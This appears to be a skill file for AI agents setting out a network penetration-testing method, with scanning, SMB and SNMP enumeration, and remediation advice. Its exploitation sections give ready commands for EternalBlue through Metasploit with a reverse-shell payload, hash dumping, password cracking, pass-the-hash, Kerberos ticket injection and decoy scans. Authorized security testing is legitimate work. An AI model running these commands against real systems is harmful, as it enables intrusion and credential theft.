---
name: network-penetration-testing
description: Professional skills and methodology for network penetration testing
version: 1.0.0
---

# Network Penetration Testing

## Overview

Network penetration testing is a key discipline for evaluating the security of network infrastructure. This skill provides the methods, tooling, and best practices for network testing.

## Test scope

### 1. Information gathering

**Checks:**
- Network topology
- Host discovery
- Port scanning
- Service identification

### 2. Vulnerability scanning

**Checks:**
- System vulnerabilities
- Service vulnerabilities
- Misconfigurations
- Weak passwords

### 3. Exploitation

**Checks:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Information gathering

### Network scanning

**Nmap:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scan
nmap -sS -p- 192.168.1.100

# Service identification
nmap -sV -sC 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Full scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Masscan:**
```bash
# Fast port scan
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service enumeration

**SMB enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //192.168.1.100 -N

# Enumerate SMB users
enum4linux -U 192.168.1.100

# Using nmap scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# Enumerate RPC services
rpcclient -U "" -N 192.168.1.100

# Using nmap scripts
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP scan
snmpwalk -v2c -c public 192.168.1.100

# Using onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability scanning

### Nessus

```bash
# Start Nessus
# Open the web interface
# Create a scan job
# Analyze scan results
```

### OpenVAS

```bash
# Start OpenVAS
gvm-setup

# Open the web interface
# Create a scan job
# Analyze scan results
```

### Nmap scripts

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.100

# Specific-vulnerability scan
nmap --script smb-vuln-ms17-010 192.168.1.100

# All scripts
nmap --script all 192.168.1.100
```

## Exploitation

### Metasploit

**Basic usage:**
```bash
# Start Metasploit
msfconsole

# Search for an exploit
search ms17-010

# Select a module
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Run
exploit
```

**Post-exploitation:**
```bash
# System info
sysinfo

# Elevate privileges
getsystem

# Migrate process
migrate <pid>

# Dump hashes
hashdump

# Dump credentials
run post/windows/gather/smart_hashdump
```

### Common exploits

**EternalBlue:**
```bash
# Via Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Via standalone tool
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# Via Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# Via standalone tool
python smbghost.py 192.168.1.100
```

## Lateral movement

### Password cracking

**Hashcat:**
```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt wordlist.txt

# Crack LM hashes
hashcat -m 3000 hashes.txt wordlist.txt

# With rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**John:**
```bash
# Crack hashes
john hashes.txt

# With a wordlist
john --wordlist=wordlist.txt hashes.txt

# With rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Impacket:**
```bash
# SMB pass-the-hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI pass-the-hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP pass-the-hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Mimikatz:**
```bash
# Export tickets
sekurlsa::tickets /export

# Inject a ticket
kerberos::ptt ticket.kirbi
```

**Rubeus:**
```bash
# Request a ticket
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inject a ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tool usage

### Nmap

```bash
# Full scan
nmap -sS -sV -sC -O -p- -T4 target

# Stealthy scan
nmap -sS -T2 -f -D RND:10 target

# UDP scan
nmap -sU -p- target
```

### Metasploit

```bash
# Start the framework
msfconsole

# Initialize the database
msfdb init

# Import scan results
db_import nmap.xml

# List hosts
hosts

# List services
services
```

### Burp Suite

**Network scanning:**
1. Configure the proxy
2. Browse the target network
3. Analyze traffic
4. Run active scans

## Testing checklist

### Information gathering
- [ ] Network-topology discovery
- [ ] Host discovery
- [ ] Port scanning
- [ ] Service identification
- [ ] OS fingerprinting

### Vulnerability scanning
- [ ] System vulnerability scan
- [ ] Service vulnerability scan
- [ ] Misconfiguration checks
- [ ] Weak-password checks

### Exploitation
- [ ] Remote code execution
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Common security issues

### 1. Unpatched systems

**Problem:**
- Systems not updated in time
- Known vulnerabilities present
- Poor patch management

**Fix:**
- Install patches promptly
- Establish a patch-management process
- Regular security updates

### 2. Weak passwords

**Problem:**
- Default passwords
- Simple passwords
- Password reuse

**Fix:**
- Enforce a strong-password policy
- Enable multi-factor authentication
- Rotate passwords regularly

### 3. Open ports

**Problem:**
- Unnecessary ports open
- Services exposed
- Firewall misconfiguration

**Fix:**
- Close unneeded ports
- Implement firewall rules
- Use VPN access

### 4. Misconfigurations

**Problem:**
- Default configurations
- Excessive permissions
- Poorly configured services

**Fix:**
- Secure-configuration baselines
- Least-privilege principle
- Regular configuration reviews

## Best practices

### 1. Information gathering

- Scan thoroughly
- Verify with multiple tools
- Record findings
- Analyze results

### 2. Exploitation

- Authorized testing only
- Minimal impact
- Log all actions
- Clean up promptly

### 3. Report writing

- Detailed records
- Risk ratings
- Remediation advice
- Verification steps

## Notes

- Test only in authorized environments
- Avoid impacting production systems
- Comply with laws and regulations
- Protect test data
